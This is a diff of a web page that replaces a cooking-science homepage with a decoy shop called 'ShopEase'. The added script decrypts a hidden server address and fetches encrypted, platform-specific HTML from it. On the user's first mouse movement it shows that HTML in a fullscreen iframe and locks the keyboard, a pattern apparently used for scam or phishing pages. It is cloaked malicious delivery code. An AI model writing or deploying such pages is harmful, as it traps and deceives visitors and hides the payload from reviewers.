@@ -1,410 +1,312 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>KitchenNotes | Culinary Laboratory, Recipe Ratios & Gastronomy Science</title>
-  <meta name="description" content="KitchenNotes is a culinary research atelier dedicated to the thermal physics, recipe ratios, and flavor balancing of modern gastronomy.">
-  <link rel="stylesheet" href="style.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-OD</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
+
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
   <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
   <script>
     window.dataLayer = window.dataLayer || [];
     function gtag(){dataLayer.push(arguments);}
     gtag('js', new Date());
+
     gtag('config', 'G-0LY0HY7L01');
   </script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
 <body>
-  <aside class="kitchen-telemetry-ribbon">
-    <div class="container top-telemetry-flex">
-      <div class="kitchen-ping-badge"><span class="kitchen-ping"></span><span>KitchenNotes &bull; Test Kitchen Laboratory &bull; Culinary Ratios &bull; Science of Gastronomy</span></div>
-      <div class="telemetry-right-text"><span>Test Kitchen Atelier: 181 Mercer Street, New York, NY 10012</span> &bull; <a href="tel:+18887775845" style="color: var(--primary-accent-light); text-decoration: underline;">Tel: +1-888-777-5845</a></div>
-    </div>
-  </aside>
-  <header class="kitchen-header">
-    <div class="container header-nav-flex">
-      <a href="index.php" class="brand-link" aria-label="KitchenNotes Home">
-        <div class="brand-monogram-box">
-          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"/><circle cx="8" cy="16" r="1.5"/></svg>
-        </div>
-        <div class="brand-wordmark-cluster">
-          <span class="brand-title">KitchenNotes</span>
-          <span class="brand-sub">Culinary Field Laboratory</span>
-        </div>
-      </a>
 
-      <ul class="kitchen-nav-menu" id="navMenu">
-        <li><a href="index.php" class="kitchen-nav-link active">Laboratory</a></li>
-        <li><a href="about.html" class="kitchen-nav-link ">Manifesto</a></li>
-        <li><a href="blog.html" class="kitchen-nav-link ">Field Notes</a></li>
-        <li><a href="index.php#ratio-engine" class="kitchen-nav-link">Ratio Engine</a></li>
-        <li><a href="index.php#flavor-matrix" class="kitchen-nav-link">Flavor Matrix</a></li>
-        <li><a href="contact.html" class="kitchen-nav-link ">Consultation</a></li>
-      </ul>
-
-      <div class="header-action-cluster">
-        <button class="btn-theme-toggle" id="themeToggleBtn" type="button" aria-label="Toggle Color Theme">Cast Iron Dark</button>
-        <a href="contact.html" class="btn-primary">Book Consultation</a>
-        <button class="mobile-toggle-btn" id="mobileMenuBtn" type="button" aria-label="Toggle Mobile Menu">&#9776;</button>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
       </div>
     </div>
-  </header>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
 
-  <!-- HERO SECTION -->
-  <section class="hero-section">
-    <div class="container hero-grid">
-      <div>
-        <div class="hero-badge-tag">
-          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="m9 12 2 2 4-4"/></svg>
-          <span>Laboratory Tested &bull; Food Chemistry &bull; Zero Guesswork</span>
-        </div>
-        <h1 class="hero-title">
-          Master the Science of <em>Cooking</em> Through Systematic Precision.
-        </h1>
-        <p class="hero-lead">
-          KitchenNotes bridges the divide between artisanal culinary intuition and rigorous food physics. Explore recipe ratios, thermal conduction, emulsion stability, and botanical flavor balancing.
-        </p>
-        <div class="hero-button-group">
-          <a href="#ratio-engine" class="btn-primary">Launch Ratio Engine</a>
-          <a href="about.html" class="btn-secondary">Test Kitchen Manifesto</a>
-        </div>
-        <div class="hero-metrics-strip">
-          <div class="metric-item-cluster">
-            <h3>400+</h3>
-            <span>Kitchen Trials</span>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
+    </section>
+
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
+
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
           </div>
-          <div class="metric-item-cluster">
-            <h3>100%</h3>
-            <span>Ratio Accuracy</span>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
           </div>
-          <div class="metric-item-cluster">
-            <h3>0°</h3>
-            <span>Thermal Variance</span>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
           </div>
         </div>
       </div>
+    </section>
 
-      <div class="hero-image-card">
-        <img src="images/hero-chef-kitchen.jpg" alt="Chef conducting precision culinary research at KitchenNotes atelier" width="600" height="480">
-        <div class="hero-overlay-note">
-          <h4>Test Kitchen Field Log #104</h4>
-          <p>Thermal pan mapping and kinetic moisture dissipation during high-heat searing.</p>
-        </div>
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
       </div>
-    </div>
-  </section>
+    </section>
 
-  <!-- TEST KITCHEN PILLARS (BENTO GRID) -->
-  <section class="section-padding" style="background: var(--bg-surface-elevated);">
-    <div class="container">
-      <div class="section-header-block">
-        <span class="section-pretitle">The Four Pillars</span>
-        <h2 class="section-main-heading">Foundational Gastronomy Disciplines</h2>
-        <p class="section-subtext">Every dish is an interconnected web of thermodynamic exchange, enzymatic transformation, and structural emulsion.</p>
-      </div>
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
 
-      <div class="bento-grid-3">
-        <div class="bento-card">
-          <div class="bento-icon-box">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
-          </div>
-          <h3 class="bento-card-title">1. Culinary Ratios & Scaling</h3>
-          <p class="bento-card-desc">Move beyond rigid static recipe sheets. By understanding fundamental ratios—from 3:1 vinaigrettes to 72% sourdough hydration—you can cook intuitively at any batch size.</p>
-          <div class="tech-tag-row">
-            <span class="tech-tag">3:1 Emulsion</span>
-            <span class="tech-tag">2.5% Salinity</span>
-            <span class="tech-tag">Bakers %</span>
-          </div>
-        </div>
 
-        <div class="bento-card">
-          <div class="bento-icon-box">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
-          </div>
-          <h3 class="bento-card-title">2. Thermal Conduction & Searing</h3>
-          <p class="bento-card-desc">Control heat transfer mechanics. Discover how the Leidenfrost effect, pan thermal mass, and surface moisture evaporation dictate deep Maillard crust formation.</p>
-          <div class="tech-tag-row">
-            <span class="tech-tag">150°C-180°C Maillard</span>
-            <span class="tech-tag">Cast Iron Mass</span>
-          </div>
-        </div>
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
 
-        <div class="bento-card">
-          <div class="bento-icon-box">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m12 3-1.912 5.813a2 2 0 0 1-1.275 1.275L3 12l5.813 1.912a2 2 0 0 1 1.275 1.275L12 21l1.912-5.813a2 2 0 0 1 1.275-1.275L21 12l-5.813-1.912a2 2 0 0 1-1.275-1.275L12 3Z"/></svg>
-          </div>
-          <h3 class="bento-card-title">3. Botanical Flavor Balancing</h3>
-          <p class="bento-card-desc">Calibrate salinity, bright organic acids, roasted bitterness, and savory amino glutamates at the pass. Balance volatile essential oils and fresh herbs for maximum aromatic resonance.</p>
-          <div class="tech-tag-row">
-            <span class="tech-tag">pH 3.8-4.5</span>
-            <span class="tech-tag">Glutamate Synergy</span>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX1/c6oSZBXUVJE9t5Ut20g0YQEJr27pxneGal+oblg4yRgD+A9Oa0tJC";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
 
-  <!-- INTERACTIVE RATIO CALCULATOR ENGINE -->
-  <section class="section-padding" id="ratio-engine">
-    <div class="container">
-      <div class="section-header-block">
-        <span class="section-pretitle">Precision Tool</span>
-        <h2 class="section-main-heading">Interactive Culinary Ratio Engine</h2>
-        <p class="section-subtext">Select a classical culinary foundation and drag the scale slider to compute exact gram weight ratios for your kitchen preparation.</p>
-      </div>
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
 
-      <div class="ratio-engine-wrapper">
-        <div class="ratio-controls-grid">
-          <div class="ratio-selector-list">
-            <button class="ratio-btn active" data-ratio="vinaigrette" type="button">
-              <h4>Classical Vinaigrette Emulsion</h4>
-              <p>3:1 Oil to Acid with Surfactant Stabilization</p>
-            </button>
-            <button class="ratio-btn" data-ratio="sourdough" type="button">
-              <h4>Artisan Sourdough Hydration</h4>
-              <p>72% High-Hydration Wild Fermentation</p>
-            </button>
-            <button class="ratio-btn" data-ratio="brine" type="button">
-              <h4>Equilibrium Vegetable Brine</h4>
-              <p>2.5% Saline Preservation Matrix</p>
-            </button>
-            <button class="ratio-btn" data-ratio="roux" type="button">
-              <h4>Classical Velouté Roux Base</h4>
-              <p>1:1 Clarified Fat to Flour Thickener</p>
-            </button>
-          </div>
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
 
-          <div class="ratio-output-display">
-            <h3 id="ratioTitle" style="font-family: var(--font-display); font-size: 1.35rem; margin-bottom: 0.5rem;">Classical Vinaigrette Emulsion</h3>
-            <span class="ratio-formula-badge" id="ratioFormula">3 Parts Oil : 1 Part Acid / Verjus</span>
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
 
-            <div class="ratio-scale-slider-box">
-              <label>
-                <span>Target Batch Weight:</span>
-                <span id="ratioSliderVal" style="color: var(--primary-accent); font-family: var(--font-mono); font-weight: 700;">100g</span>
-              </label>
-              <input type="range" class="range-input" id="ratioSlider" min="50" max="2000" step="25" value="100">
-            </div>
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
 
-            <table class="ingredients-ratio-table">
-              <thead>
-                <tr>
-                  <th>Component Ingredient</th>
-                  <th style="text-align: right;">Calculated Weight</th>
-                </tr>
-              </thead>
-              <tbody id="ingredientsTableBody">
-                <!-- Dynamically Rendered by script.js -->
-              </tbody>
-            </table>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
 
-  <!-- FLAVOR COMPOUND MATRIX -->
-  <section class="section-padding" id="flavor-matrix" style="background: var(--bg-surface-elevated);">
-    <div class="container">
-      <div class="section-header-block">
-        <span class="section-pretitle">Sensory Blueprint</span>
-        <h2 class="section-main-heading">The Flavor Compound Balancing Matrix</h2>
-        <p class="section-subtext">How master chefs diagnose, adjust, and elevate flavors at the finishing pass.</p>
-      </div>
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
 
-      <div class="flavor-matrix-grid">
-        <div class="flavor-node-card">
-          <div class="flavor-node-header">
-            <h3 class="flavor-node-title">Acidity (Salivation & Brightness)</h3>
-            <span class="flavor-node-chem">pH 3.2 - 4.5</span>
-          </div>
-          <p class="flavor-node-body">
-            Acidity stimulates salivary glands, thins the perception of heavy fats, and brings muted herbal aromas into sharp olfactory focus. Adjust with early-harvest verjus, cold-pressed lemon juice, or lacto-fermented berry broths.
-          </p>
-        </div>
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
 
-        <div class="flavor-node-card amber">
-          <div class="flavor-node-header">
-            <h3 class="flavor-node-title">Lipids & Emulsions (Viscosity)</h3>
-            <span class="flavor-node-chem">Oleic / Linoleic Acids</span>
-          </div>
-          <p class="flavor-node-body">
-            Fats coat the papillae of the tongue, delaying flavor dissipation and carrying fat-soluble aromatic terpenes (such as rosemary and thyme) deeper into the nasal cavity.
-          </p>
-        </div>
-
-        <div class="flavor-node-card blue">
-          <div class="flavor-node-header">
-            <h3 class="flavor-node-title">Umami Resonance (Savoriness)</h3>
-            <span class="flavor-node-chem">Glutamic Acid + Inosinate</span>
-          </div>
-          <p class="flavor-node-body">
-            Combining free glutamates (found in roasted mushrooms, aged misos, and fermented grains) with ribonucleotides creates an exponential synergy, lingering on the palate for minutes.
-          </p>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- CULINARY LOOKBOOK & FIELD PHOTOGRAPHY -->
-  <section class="section-padding">
-    <div class="container">
-      <div class="section-header-block">
-        <span class="section-pretitle">Visual Field Log</span>
-        <h2 class="section-main-heading">Technique In Action</h2>
-        <p class="section-subtext">Photographic documentation from our daily test kitchen trials and technique sessions.</p>
-      </div>
-
-      <div class="lookbook-grid">
-        <div class="lookbook-item-large">
-          <img src="images/culinary-prep-board.jpg" alt="Artisanal culinary preparation board with organic ingredients">
-          <div class="lookbook-caption">
-            <h4>Mise en Place Precision</h4>
-            <p>Uniform knife cuts ensure synchronized thermal cooking rates across all vegetables.</p>
-          </div>
-        </div>
-
-        <div class="lookbook-item-small">
-          <img src="images/artisanal-sauce-pan.jpg" alt="Artisanal sauce reduction simmering in stainless pan">
-          <div class="lookbook-caption">
-            <h4>Pan Reduction Kinetics</h4>
-            <p>Simmering at 85°C to concentrate flavor esters without scorching sugars.</p>
-          </div>
-        </div>
-
-        <div class="lookbook-item-small">
-          <img src="images/cast-iron-roast.jpg" alt="Cast iron pan roasting seasonal produce">
-          <div class="lookbook-caption">
-            <h4>Thermal Mass Roasting</h4>
-            <p>Retaining radiant heat to create deep surface caramelization.</p>
-          </div>
-        </div>
-
-        <div class="lookbook-item-large">
-          <img src="images/artisan-sourdough-baking.jpg" alt="Hearth baked sourdough bread with blistered crust">
-          <div class="lookbook-caption">
-            <h4>Steam-Injected Bread Baking</h4>
-            <p>72% hydration wild yeast dough expanding inside a sealed hearth chamber.</p>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- TEST KITCHEN FAQS -->
-  <section class="section-padding" style="background: var(--bg-surface-elevated);">
-    <div class="container">
-      <div class="section-header-block">
-        <span class="section-pretitle">Frequently Asked Questions</span>
-        <h2 class="section-main-heading">Kitchen Science & Methodology</h2>
-        <p class="section-subtext">Common technical questions regarding culinary ratios, cooking physics, and kitchen equipment.</p>
-      </div>
-
-      <div class="faq-accordion-box">
-        <div class="faq-item">
-          <button class="faq-trigger" type="button">
-            <span>Why do culinary ratios work better than volume-based recipes?</span>
-            <span class="faq-icon">+</span>
-          </button>
-          <div class="faq-body">
-            <p>Volume measurements (like cups and tablespoons) are notoriously inconsistent due to ingredient density variations, settling, and moisture levels. A cup of flour can vary between 110g and 160g depending on how it is scooped. Working in precise weight ratios (grams) ensures 100% repeatability regardless of batch size or container shape.</p>
-          </div>
-        </div>
-
-        <div class="faq-item">
-          <button class="faq-trigger" type="button">
-            <span>What causes a sauce emulsion to break, and how can it be rescued?</span>
-            <span class="faq-icon">+</span>
-          </button>
-          <div class="faq-body">
-            <p>Emulsions break when lipid droplets coalesce due to excessive heat (denaturing surfactant proteins), adding oil too rapidly before the water phase can encapsulate it, or insufficient agitation. To rescue a broken vinaigrette or emulsion, whisk one teaspoon of warm water or Dijon mustard in a clean bowl and slowly drizzle the broken sauce into it while whisking vigorously.</p>
-          </div>
-        </div>
-
-        <div class="faq-item">
-          <button class="faq-trigger" type="button">
-            <span>Why is dry pan surface essential for high-heat searing?</span>
-            <span class="faq-icon">+</span>
-          </button>
-          <div class="faq-body">
-            <p>Water has an exceptionally high latent heat of vaporization (2,260 kJ/kg). As long as surface moisture is present on your ingredients, pan energy is wasted evaporating steam at 100°C rather than reaching the 150°C–180°C threshold required for Maillard browning reactions. Thoroughly patting surfaces dry with paper towels ensures immediate crust formation.</p>
-          </div>
-        </div>
-
-        <div class="faq-item">
-          <button class="faq-trigger" type="button">
-            <span>What is the optimal salt ratio for vegetable fermentations?</span>
-            <span class="faq-icon">+</span>
-          </button>
-          <div class="faq-body">
-            <p>The standard equilibrium salinity for vegetable fermentation is precisely 2.5% of total weight (produce weight + water weight). This concentration suppresses pathogenic bacteria while allowing acid-tolerant lactic acid cultures to flourish and drop the pH safely below 4.5 within 72 hours.</p>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- FOOTER -->
-  <footer class="kitchen-footer">
-    <div class="container">
-      <div class="footer-top-grid">
-        <div>
-          <div class="brand-link" style="margin-bottom: 1rem;">
-            <div class="brand-monogram-box">
-              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"/><circle cx="8" cy="16" r="1.5"/></svg>
-            </div>
-            <div class="brand-wordmark-cluster">
-              <span class="brand-title" style="color: #ffffff;">KitchenNotes</span>
-              <span class="brand-sub" style="color: #84cc16;">Culinary Field Laboratory</span>
-            </div>
-          </div>
-          <p class="footer-brand-p">
-            KitchenNotes is an independent culinary research atelier and technique notebook dedicated to the chemistry of food, kitchen ratios, thermal physics, and botanical flavor balancing.
-          </p>
-        </div>
-
-        <div>
-          <h4 class="footer-heading">Culinary Laboratory</h4>
-          <ul class="footer-links-list">
-            <li><a href="index.php">Test Kitchen Overview</a></li>
-            <li><a href="about.html">Laboratory Manifesto</a></li>
-            <li><a href="blog.html">Culinary Field Notes</a></li>
-            <li><a href="index.php#ratio-engine">Culinary Ratio Engine</a></li>
-            <li><a href="index.php#flavor-matrix">Flavor Compound Matrix</a></li>
-          </ul>
-        </div>
-
-        <div>
-          <h4 class="footer-heading">Technique Articles</h4>
-          <ul class="footer-links-list">
-            <li><a href="blog/the-science-of-culinary-emulsions-fat-water-and-surfactant-mechanics.html">Emulsion Science</a></li>
-            <li><a href="blog/mastering-pan-deglazing-and-fond-extraction-building-layered-pan-sauces.html">Pan Deglazing Mechanics</a></li>
-            <li><a href="blog/the-chemistry-of-maillard-reactions-searing-temperatures-and-crust-formation.html">Maillard Reaction Physics</a></li>
-            <li><a href="blog/knife-skills-and-geometric-precision-julienne-brunoise-and-chiffonade-physics.html">Knife Skills Geometry</a></li>
-            <li><a href="blog/thermal-mass-and-heat-retention-cast-iron-stainless-steel-and-copper-cookware.html">Cookware Thermodynamics</a></li>
-          </ul>
-        </div>
-
-        <div>
-          <h4 class="footer-heading">Atelier Governance</h4>
-          <ul class="footer-links-list">
-            <li><a href="privacy.html">Privacy Policy</a></li>
-            <li><a href="terms.html">Terms of Service</a></li>
-            <li><a href="disclaimer.html">Culinary Disclaimer</a></li>
-            <li><a href="cookies.html">Cookie Policy</a></li>
-            <li><a href="contact.html">Laboratory Consultation</a></li>
-          </ul>
-        </div>
-      </div>
-
-      <div class="footer-bottom-bar">
-        <p>&copy; <?php echo date('Y'); ?> KitchenNotes Atelier. All rights reserved. 181 Mercer Street, New York, NY 10012 &bull; +1-888-777-5845.</p>
-        <p>Ultra-Clean Gastronomic Web Architecture &bull; Science of Modern Cookery</p>
-      </div>
-    </div>
-  </footer>
-
-  <script src="script.js"></script>
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
